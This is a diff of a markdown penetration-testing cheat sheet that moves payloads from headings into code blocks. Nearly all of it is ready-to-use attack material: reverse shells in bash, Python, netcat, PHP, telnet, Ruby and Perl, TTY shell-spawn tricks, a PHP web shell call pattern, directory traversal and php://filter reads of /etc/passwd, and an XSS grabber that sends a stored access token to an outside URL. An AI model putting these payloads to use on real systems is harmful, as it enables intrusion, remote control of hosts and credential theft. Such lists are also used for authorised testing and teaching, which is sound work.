@@ -33,9 +33,8 @@ ____
 * #### [Useful LFI files (Windows)](#useful_lfi_windows)
 ### XSS
 * #### [Data grabber for XSS](#data_grabber_xss)
-* #### [XSS in HTML/Applications](#xss_in_app)
-  * ##### [Basic Payload](#basic_payload)
-  * ##### [Img tag payload](#img_tag_payload)
+* #### [Basic Payload](#basic_payload)
+* #### [Img tag payload](#img_tag_payload)
 * #### [XSS in Markdown](#xss_in_markdown)
 * #### [XSS in SVG](#xss_in_svg)
 * #### [Bypass word blacklist with code evaluation](#bypass_word_blacklist_with_code_evaluation)
@@ -65,8 +64,9 @@ ____
 ____
 
 ### Reverse shell > <a name="reverse_shell_bash"></a>Bash
-###### bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'
-
+```html
+bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'
+```
 ### Reverse shell > <a name="reverse_shell_python"></a>Python
 ```python  
 python -c 'import sys,socket,os,pty;s=socket.socket()
@@ -76,52 +76,67 @@ python -c 'import sys,socket,os,pty;s=socket.socket()
 ```
 
 ### Reverse shell > <a name="reverse_shell_netcat"></a>Netcat
-###### rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f
-
+```html
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f
+```
 ### Reverse shell > <a name="reverse_shell_php"></a>PHP
-###### php -r '$sock=fsockopen(getenv("127.0.0.1"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'
-
+```html
+php -r '$sock=fsockopen(getenv("127.0.0.1"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 ### Reverse shell > <a name="reverse_shell_telnet"></a>Telnet
-###### TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1234 0<$TF | /bin/sh 1>$TF
-
+```html
+TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1234 0<$TF | /bin/sh 1>$TF
+```
 ### Reverse shell > <a name="reverse_shell_ruby"></a>Ruby
-###### ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["127.0.0.1"],ENV["1234"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-
+```html
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["127.0.0.1"],ENV["1234"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
 ### Reverse shell > <a name="reverse_shell_perl"></a>Perl
-###### perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
+```html
+perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 ____
 
 ### TTY Spawn Shell > <a name="python_spawn_shell"></a>Python spawn shell
-###### python -c 'import pty; pty.spawn("/bin/sh")'
-
+```html
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
 ### TTY Spawn Shell > <a name="os_system_spawn_shell"></a>OS system spawn shell
-###### echo os.system("/bin/bash")
-
+```html
+echo os.system("/bin/bash")
+```
 ### TTY Spawn Shell > <a name="bash_spawn_shell"></a>Bash spawn shell
-###### /bin/sh -i
-
+```html
+/bin/sh -i
+```
 ### TTY Spawn Shell > <a name="perl_spawn_shell"></a>Perl spawn shell
-###### perl —e 'exec "/bin/sh";'
-
+```html
+perl —e 'exec "/bin/sh";'
+```
 ### TTY Spawn Shell > <a name="ruby_spawn_shell"></a>Ruby spawn shell
-###### ruby: exec "/bin/sh"
-
+```html
+ruby: exec "/bin/sh"
+```
 ### TTY Spawn Shell > <a name="lua_spawn_shell"></a>Lua spawn shell
-###### lua: os.execute("/bin/sh")
-
+```html
+lua: os.execute("/bin/sh")
+```
 ### TTY Spawn Shell > <a name="irb_spawn_shell"></a>IRB spawn shell
-###### exec "/bin/sh"
-
+```html
+exec "/bin/sh"
+```
 ### TTY Spawn Shell > <a name="vi_spawn_shell"></a>VI spawn shell
-###### :!bash
-
+```html
+:!bash
+```
 ### TTY Spawn Shell > <a name="vi2_spawn_shell"></a>VI(2) spawn shell
-###### :set shell=/bin/bash:shell
-
+```html
+:set shell=/bin/bash:shell
+```
 ### TTY Spawn Shell > <a name="nmap_spawn_shell"></a>Nmap spawn shell
-###### !sh
-
+```html
+!sh
+```
 ____
 
 ### PHP Reverse Shell > <a name="rce_vuln"></a>RCE
@@ -155,19 +170,23 @@ http://site.com/path/to/shell.php?_=function&__=argument
 http://site.com/path/to/shell.php?_=system&__=ls
 ```
 ### PHP Reverse Shell > <a name="php_reverse_shell"></a>PHP Reverse Shell (Pentestmonkey)
-###### https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-
+```html
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+```
 ____
 
 ### LFI > <a name="directory_traversal"></a>Directory Traversal
-###### some.php?file=../../../../../../../etc/passwd
-
+```html
+some.php?file=../../../../../../../etc/passwd
+```
 ### LFI > <a name="php_wrapper_file"></a>PHP Wrapper php://file
-###### example.php?page=expect://ls
-
+```html
+example.php?page=expect://ls
+```
 ### LFI > <a name="php_wrapper_filter"></a>PHP Wrapper php://filter
-###### example.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
-
+```html
+example.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+```
 ### LFI > <a name="useful_lfi_linux"></a>Useful LFI files (Linux)
 ```html
 /etc/passwd
@@ -270,7 +289,6 @@ ____
 <script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
 ```
 
-### XSS > <a name="xss_in_app"></a>XSS in HTML/Applications
 ### XSS > <a name="basic_payload"></a>Basic Payload
 ```html
 <script>alert('XSS')</script>
